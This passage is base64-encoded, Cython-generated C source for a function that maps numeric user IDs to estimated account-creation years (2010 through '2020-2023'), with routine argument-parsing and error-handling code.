GkpOyBfX1BZWF9FUlIoMCwgMjcwLCBfX3B5eF9MM19lcnJvcikgfQogICAgICB9CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDIpKSB7CiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICB9IGVsc2UgewogICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDI3MCwgX19weXhfTDNfZXJyb3IpCiAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgMjcwLCBfX3B5eF9MM19lcnJvcikKICAgIH0KICAgIF9fcHl4X3Zfc2VsZiA9IHZhbHVlc1swXTsKICAgIF9fcHl4X3ZfSWQgPSB2YWx1ZXNbMV07CiAgfQogIGdvdG8gX19weXhfTDZfc2tpcDsKICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7CiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImRhdGUiLCAxLCAyLCAyLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAyNzAsIF9fcHl4X0wzX2Vycm9yKQogIF9fcHl4X0w2X3NraXA6OwogIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7CiAgX19weXhfTDNfZXJyb3I6OwogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5kYXRlIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIE5VTEw7CiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6OwogIF9fcHl4X3IgPSBfX3B5eF9wZl8ydGZfNUdob3N0XzE4ZGF0ZShfX3B5eF9zZWxmLCBfX3B5eF92X3NlbGYsIF9fcHl4X3ZfSWQpOwoKICAKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfMThkYXRlKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfSWQpIHsKICBQeU9iamVjdCAqX19weXhfdl91aWQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIGludCBfX3B5eF90XzU7CiAgaW50IF9fcHl4X3RfNjsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJkYXRlIiwgMCk7CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5TnVtYmVyX0ludChfX3B5eF92X0lkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjcyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fcHl4X3ZfdWlkID0gKChQeU9iamVjdCopX19weXhfdF80KTsKICAgICAgX19weXhfdF80ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgX19weXhfdl91aWQsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNzMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsKICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEyNzkwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNzMsIF9fcHl4X0wzX2Vycm9yKQogICAgICB9CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDI3MywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBpZiAoX19weXhfdF81KSB7CgogICAgICAgIAogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDEwKTsKICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTA7CiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuOwoKICAgICAgICAKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMjc5MDAxLCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI3NSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KSkgewogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOwogICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTc3NTAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNzUsIF9fcHl4X0wzX2Vycm9yKQogICAgICB9CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDI3NSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBpZiAoX19weXhfdF81KSB7CgogICAgICAgIAogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDExKTsKICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTE7CiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuOwoKICAgICAgICAKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xNzc1MDAwMSwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNzcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsKICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzI3OTc2MDAwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI3NywgX19weXhfTDNfZXJyb3IpCiAgICAgIH0KICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjc3LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIGlmIChfX3B5eF90XzUpIHsKCiAgICAgICAgCiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTIpOwogICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMjsKICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47CgogICAgICAgIAogICAgICB9CgogICAgICAKICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzI3OTc2MDAwMSwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNzksIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsKICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzkwMDk5MDAwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI3OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIH0KICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjc5LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIGlmIChfX3B5eF90XzUpIHsKCiAgICAgICAgCiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTMpOwogICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMzsKICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47CgogICAgICAgIAogICAgICB9CgogICAgICAKICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzkwMDk5MDAwMSwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyODEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsKICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE2MjkwMTAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyODEsIF9fcHl4X0wzX2Vycm9yKQogICAgICB9CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDI4MSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBpZiAoX19weXhfdF81KSB7CgogICAgICAgIAogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE0KTsKICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTQ7CiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuOwoKICAgICAgICAKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xOTAwMDAwMDAwLCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI4MywgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KSkgewogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOwogICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI4MywgX19weXhfTDNfZXJyb3IpCiAgICAgIH0KICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjgzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIGlmIChfX3B5eF90XzUpIHsKCiAgICAgICAgCiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTUpOwogICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxNTsKICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47CgogICAgICAgIAogICAgICB9CgogICAgICAKICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzI1MDAwMDAwMDAsIF9fcHl4X3ZfdWlkLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjg1LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91aWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8zNzEzNjY4Nzg2LCBQeV9MVCk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjg1LCBfX3B5eF9MM19lcnJvcikKICAgICAgfQogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzUgPCAwKSkpIF9fUFlYX0VSUigwLCAyODUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgaWYgKF9fcHl4X3RfNSkgewoKICAgICAgICAKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxNik7CiAgICAgICAgX19weXhfciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE2OwogICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjsKCiAgICAgICAgCiAgICAgIH0KCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMzcxMzY2ODc4NiwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyODcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsKICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzU2OTk3ODUyMTcsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyODcsIF9fcHl4X0wzX2Vycm9yKQogICAgICB9CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDI4NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBpZiAoX19weXhfdF81KSB7CgogICAgICAgIAogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE3KTsKICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTc7CiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuOwoKICAgICAgICAKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF81Njk5Nzg1MjE3LCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KSkgewogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOwogICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfODUwNzk0MDYzNCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIH0KICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjg5LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIGlmIChfX3B5eF90XzUpIHsKCiAgICAgICAgCiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTgpOwogICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxODsKICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47CgogICAgICAgIAogICAgICB9CgogICAgICAKICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50Xzg1MDc5NDA2MzQsIF9fcHl4X3ZfdWlkLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjkxLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91aWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMTI1NDAyOTgzNCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI5MSwgX19weXhfTDNfZXJyb3IpCiAgICAgIH0KICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjkxLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIGlmIChfX3B5eF90XzUpIHsKCiAgICAgICAgCiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTkpOwogICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxOTsKICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47CgogICAgICAgIAogICAgICB9CgogICAgICAKICAgICAgIHsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzIwMjBfMjAyMyk7CiAgICAgICAgX19weXhfciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjAyMF8yMDIzOwogICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjsKICAgICAgfQoKICAgICAgCiAgICB9CiAgICBfX3B5eF9MM19lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CgogICAgCiAgICBfX3B5eF90XzYgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7CiAgICBpZiAoX19weXhfdF82KSB7CiAgICAgIF9fUHl4X0VyclJlc3RvcmUoMCwwLDApOwoKICAgICAgCiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91Xyk7CiAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzsKICAgICAgZ290byBfX3B5eF9MNl9leGNlcHRfcmV0dXJuOwogICAgfQogICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7CgogICAgCiAgICBfX3B5eF9MNV9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDdfdHJ5X3JldHVybjo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTsKICAgIGdvdG8gX19weXhfTDA7CiAgICBfX3B5eF9MNl9leGNlcHRfcmV0dXJuOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF